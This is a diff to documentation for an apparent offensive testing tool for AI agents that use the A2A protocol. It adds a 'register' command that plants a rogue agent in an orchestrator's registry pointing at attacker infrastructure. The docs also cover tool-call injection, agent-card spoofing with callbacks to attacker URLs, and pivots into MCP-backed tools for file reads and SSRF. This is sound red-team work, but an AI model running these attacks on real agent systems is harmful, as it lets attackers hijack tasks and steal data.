@@ -39,6 +39,7 @@ A2A is an open agent-protocol frontier with near-zero CVEs but real structural w
 | `scrape-loop` | Continuous task-submission loop for data extraction |
 | `tool-inject` | Inject a tool call via a task message to test blind forwarding |
 | `replay` | Replay a message to test deterministic / stateless behavior |
+| `register` | Register a rogue agent with an orchestrator's registry |
 
 ## Flags
 
@@ -66,6 +67,7 @@ A2A is an open agent-protocol frontier with near-zero CVEs but real structural w
 | `scrape-loop` | `--prompt` (repeatable), `--delay` |
 | `tool-inject` | `--tool` (required), `--args` (JSON), `--task-id` |
 | `replay` | `--message` (required), `--original-task-id` |
+| `register` | `--agent-url` (required — the URL the orchestrator routes to, attacker infra), `--agent-name`, `--description`, `--skill` (repeatable), `--register-path` (default `/agents/register`), `--list-path` (default `/agents`) |
 
 ## What each `landed` level means here
 
@@ -73,8 +75,8 @@ Findings carry a `landed` axis recording what actually landed on the target, and
 
 | `landed` | What produces it in a2a |
 |---|---|
-| `reachable` | `enum`, `skills`, and the safe/rejected branch of every probe — the card and skills were read, or the agent rejected the probe. |
-| `influenced` | Our input was accepted but no readback/execution is confirmed: `auth-probe` (unauthenticated read processed), `msg-integrity` (bad/absent signature accepted), `sender-spoof` (forged id changes behavior), `delegate-probe` (confused-deputy outbound attempt), `card-spoof` accept-only, `push-hijack` registration accepted, `task-send` submission accepted, `mcp-pivot --loop` step that errored. |
+| `reachable` | `enum`, `skills`, and the safe/rejected branch of every probe — the card and skills were read, or the agent rejected the probe (including `register` when the orchestrator rejects the rogue-agent registration). |
+| `influenced` | Our input was accepted but no readback/execution is confirmed: `auth-probe` (unauthenticated read processed), `msg-integrity` (bad/absent signature accepted), `sender-spoof` (forged id changes behavior), `delegate-probe` (confused-deputy outbound attempt), `card-spoof` accept-only, `push-hijack` registration accepted, `task-send` submission accepted, `register` (rogue agent accepted on a genuine 2xx, whether or not it is confirmed present in the registry listing), `mcp-pivot --loop` step that errored. |
 | `read-confirmed` | We read confirmed state back off the agent: `task-status` (task state read), `push-hijack` config readback confirming the attacker webhook persisted. |
 | `execution-confirmed` | An action executed on the target: `task-send`/`task-cancel`/`stream-probe`/`tool-inject`/`replay`/`scrape-loop` on an accepted, non-OOB action; `sender-spoof` where an anonymous request is rejected but the forged-id one is accepted (privilege via spoof); `mcp-pivot --loop` step that succeeded. |
 | `takeover-capable` | Full control demonstrated: `card-spoof` or `push-hijack` with `--callback-url`, where a **real inbound out-of-band callback** confirms the agent fetched the attacker card or delivered to the attacker webhook; `mcp-pivot --preset file-read`/`ssrf` where the MCP-backed tool actually reads the file / fetches the URL. |
@@ -148,6 +150,20 @@ aipostex a2a --target http://127.0.0.1:8103 card-spoof --callback-url http://10.
 - **`tool-inject`** — instruct the agent to invoke a named `--tool` with attacker-supplied `--args` to probe blind tool forwarding.
 - **`replay`** — re-send a message and compare to a previous task's output to test for missing session binding / replayability.
 
+## Orchestrator registry (`register`)
+
+`register` (gated) posts a **rogue agent card** to an orchestrator's registration endpoint (`--register-path`, default `/agents/register`). If the orchestrator accepts unauthenticated registrations, the rogue agent — pointed at `--agent-url` (attacker-controlled infra) and advertising `--skill` ids — is now dispatchable, so the orchestrator's capability router forwards matching tasks to it (a rogue-agent-injection / confused-deputy weakness). The client tries the bare card first, then common `{"agent_card": …}` / `{"agent": …}` envelope shapes.
+
+Grading is honest about what the orchestrator actually did:
+
+- **Rejected** (no genuine 2xx to any body shape) → **Info**, `reachable`. A 4xx/5xx from an orchestrator that enforces registration auth is a clean "not weak" signal, not a transport error.
+- **Accepted** (a genuine 2xx) → **High**, `impact` / `influenced`. The verb then best-effort fetches the registry listing (`--list-path`, default `/agents`); if the rogue agent's name/url/assigned id appears, the finding notes it is **present in the registry** (still `influenced` — the orchestrator will dispatch to attacker infra), otherwise it reports acceptance with registry presence unconfirmed.
+
+```bash
+aipostex a2a --target http://127.0.0.1:8000 register \
+  --agent-url http://10.0.0.5:9000 --skill data-analysis --force-exploit
+```
+
 ## Follow-on guidance
 
 Every offensive verb emits **Next Actions** — the finding's Summary shows
@@ -178,4 +194,8 @@ aipostex a2a --target http://127.0.0.1:8103 card-spoof --card-url http://attacke
 
 # Cross-protocol pivot into MCP-backed tools
 aipostex a2a --target http://127.0.0.1:8103 mcp-pivot --preset file-read --force-exploit
+
+# Register a rogue agent with an orchestrator's registry
+aipostex a2a --target http://127.0.0.1:8000 register \
+  --agent-url http://10.0.0.5:9000 --skill data-analysis --force-exploit
 ```
